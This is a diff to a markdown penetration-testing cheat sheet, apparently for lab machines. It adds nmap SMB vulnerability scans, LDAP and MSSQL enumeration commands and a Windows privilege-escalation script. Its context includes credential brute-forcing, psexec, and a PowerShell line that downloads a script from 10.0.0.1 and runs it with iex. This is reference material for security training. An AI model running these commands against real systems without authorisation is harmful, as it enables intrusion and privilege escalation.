@@ -27,6 +27,14 @@ sudo systemctl stop apache2
 
 Default root directory is `/var/www/html`.
 
+## Scanning
+
+```bash
+nmap -Pn -sT -sV -sC <target>
+nmap -p445 --script smb-vuln-* <target>
+nmap -Pn --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <target> # SambaCry
+nmap -sU --script tftp-enum -p69,161,53 <target>
+```
 
 ## File Transfers
 
@@ -238,6 +246,14 @@ psexec.py <domain>/Administrator:<password>@10.0.0.1
 
 If there is no null user, remember to try with the guest username.
 
+If there is SMB version incompatibility, edit `/etc/samba/smb.conf` and append `min protocol = SMB1` to `[global]` seciton.    
+
+### Port 389 (LDAP)
+```
+ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local" 
+python windapsearch.py -d htb.local -U
+```
+
 ### Port 80 (HTTP)
 ```bash
 gobuster dir -u "http://target:8080/" -w /usr/share/wordlists/dirb/common.txt -t 12 -x .txt,.jsp
@@ -264,6 +280,12 @@ bundle install
 bundle exec ./winrm-brute.rb -U users.txt -P passwords.txt 10.0.0.1
 ```
 
+### Port 1433 (MSSQL)
+
+```bash
+sqsh -S <target>:1433 -U sa
+```
+
 ## Privilege Escalation
 
 ### [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
@@ -279,6 +301,12 @@ winPEAS.exe
 ```
 Import-Module .\Sherlock.ps1; Find-AllVulns
 powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1/Sherlock.ps1'); Find-AllVulns
+```
+
+#### [Powerless](https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat)
+
+```
+Powerless.bat
 ```
 
 #### [Mimikatz](https://github.com/gentilkiwi/mimikatz)
@@ -395,4 +423,4 @@ https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#metho
 
 https://book.hacktricks.xyz/
 
-https://github.com/frizb/Hydra-Cheatsheetb
+https://github.com/frizb/Hydra-Cheatsheet
